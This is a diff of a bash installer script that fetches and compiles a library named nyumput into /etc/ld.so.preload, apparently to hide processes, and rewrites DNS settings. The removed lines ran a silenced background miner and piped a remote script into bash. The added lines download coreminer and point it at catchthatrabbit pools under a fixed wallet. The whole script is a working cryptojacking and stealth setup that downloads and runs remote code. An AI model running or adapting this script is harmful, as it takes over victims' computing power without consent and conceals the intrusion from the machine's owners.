@@ -1,6 +1,6 @@
 #!/bin/bash
-apt-get update ; apt-get install sudo -y
-apt install unzip
+apt-get update ; apt-get install wget sudo -y
+apt install -y curl
 curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -9,7 +9,8 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget https://github.com/kartolo92/jadul/raw/main/plant
-chmod +x plant
-./plant -a power2b -o stratum+tcp://167.99.139.112:80 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-GG -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
+     -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008
